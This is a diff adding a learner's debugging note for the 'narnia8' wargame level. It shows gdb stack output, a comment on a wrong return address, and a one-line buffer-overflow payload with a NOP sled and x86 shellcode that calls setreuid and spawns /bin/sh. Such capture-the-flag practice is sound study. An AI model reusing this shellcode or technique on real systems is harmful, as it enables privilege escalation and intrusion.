@@ -1,0 +1,22 @@
+0x0804847b in func ()                                                                                                                                     69
+0x08048482 in func ()                                                                                                                                     62
+0x08048455 in func ()
+0x0804845b in func ()
+0x0804845d in func ()
+0x08048460 in func ()
+0x08048462 in func ()
+(gdb) x/17wx $esp
+0xffffc560:     0xffffc578      0x00000000      0x00000014      0xf7fd51a8
+0xffffc570:     0x00008000      0xf7fc7000      0x41414141      0x41414141
+0xffffc580:     0x41414141      0x41414141      0x41414141      0xffffc795
+0xffffc590:     0xffffc795      0xffffc795      0xffffc795      0x08ffcf95
+0xffffc5a0:     0xffffc795
+(gdb)
+
+
+Something wrong with setting the return val.
+0x08ffcf95 should be 0xffffcf95
+
+
+debug /narnia/narnia8 `python -c "print 'A'*20 + (chr(149) + '\xc7\xff\xff') * 4 + (chr(149) + '\xcf\xff\xff') * 4 + '\x90'*4096 + '\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xb9\x36\x66\x31\xc9\x66\xb9\xb9\x36\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80'"`
+
